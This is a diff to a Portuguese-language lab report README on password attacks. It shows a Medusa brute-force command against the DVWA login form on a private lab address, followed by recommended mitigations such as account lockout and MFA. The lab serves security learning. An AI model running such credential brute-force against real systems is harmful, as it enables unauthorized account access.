@@ -57,11 +57,11 @@ Login realizado com sucesso no servidor de arquivos via terminal.
 
 ### 4. Ataque a Aplicação Web (DVWA)
 O Medusa também foi utilizado para realizar o brute force no formulário de login do DVWA.
-- **Comando:** ```bash
+- **Comando:** `bash
 medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M http \
 -m PAGE: "/dvwa/login.php" \
 -m FORM: "username=^USER^&password=^PASS^&Login=Login" \
--m "FAIL=Login failed" -t 6 ```
+-m "FAIL=Login failed" -t 6 `
 
 **Resultado Medusa Web:**
 ![Sucesso Web](./imagens/06-medusa-web.png)
@@ -73,7 +73,7 @@ medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M http \
 A execução deste laboratório permitiu compreender como senhas fracas e protocolos mal configurados facilitam a intrusão. Para mitigar esses riscos, recomenda-se:
 
 1.  **Políticas de Senhas:** Exigir senhas complexas e trocas periódicas.
-2.  **Bloqueio de Conta (Lockout):** Configurar o sistema para travar contas após tentativas falhas consecutivas.
+2.  **Account Lockout:** Configurar bloqueio de conta após tentativas falhas.
 3.  **Desativação de Protocolos Legados:** Desabilitar serviços desnecessários ou versões antigas de protocolos (como SMBv1).
 4.  **Uso de MFA:** Implementar Autenticação de Dois Fatores sempre que possível.
 
